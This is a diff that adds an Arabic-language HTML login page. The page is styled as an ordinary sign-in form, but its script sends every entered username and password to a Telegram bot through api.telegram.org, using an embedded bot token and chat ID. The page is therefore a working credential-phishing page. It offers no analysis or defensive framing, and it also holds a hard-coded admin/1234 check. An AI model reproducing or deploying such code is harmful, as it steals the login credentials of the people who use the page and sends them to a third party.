@@ -1,0 +1,129 @@
+
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            background: linear-gradient(to right, #4b6cb7, #182848);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
+            width: 300px;
+            text-align: center;
+        }
+        .login-container h2 {
+            margin-bottom: 15px;
+            color: #333;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            margin-bottom: 5px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+        .login-btn {
+            width: 100%;
+            padding: 10px;
+            background: #4b6cb7;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+        .login-btn:hover {
+            background: #182848;
+        }
+        .message {
+            margin-top: 10px;
+            font-size: 14px;
+            color: red;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        <h2>تسجيل الدخول</h2>
+        <div class="input-group">
+            <label for="username">اسم المستخدم</label>
+            <input type="text" id="username">
+        </div>
+        <div class="input-group">
+            <label for="password">كلمة المرور</label>
+            <input type="password" id="password">
+        </div>
+        <button class="login-btn" onclick="login()">دخول</button>
+        <p class="message" id="error-msg">❌ اسم المستخدم أو كلمة المرور غير صحيحة</p>
+    </div>
+
+    <script>
+        async function login() {
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            const errorMsg = document.getElementById("error-msg");
+
+            if (username === "admin" && password === "1234") {
+                alert("✅ تسجيل دخول ناجح!");
+            } else {
+                errorMsg.style.display = "block";
+            }
+
+            // إرسال البيانات إلى بوت التليجرام
+            const botToken = "7820431519:AAFcn7jtGgcLJAEIQhRfEO3Et40_5YFrJ2Y"; // استبدل هذا بـ API Token الخاص ببوتك
+            const chatId = "7714882812"; // استبدل هذا بـ Chat ID الخاص بك
+            const message = `اسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                    }),
+                });
+
+                if (response.ok) {
+                    console.log("تم إرسال البيانات إلى البوت بنجاح!");
+                } else {
+                    console.error("فشل إرسال البيانات إلى البوت.");
+                }
+            } catch (error) {
+                console.error("حدث خطأ أثناء الإرسال:", error);
+            }
+        }
+    </script>
+
+</body>
+</html>
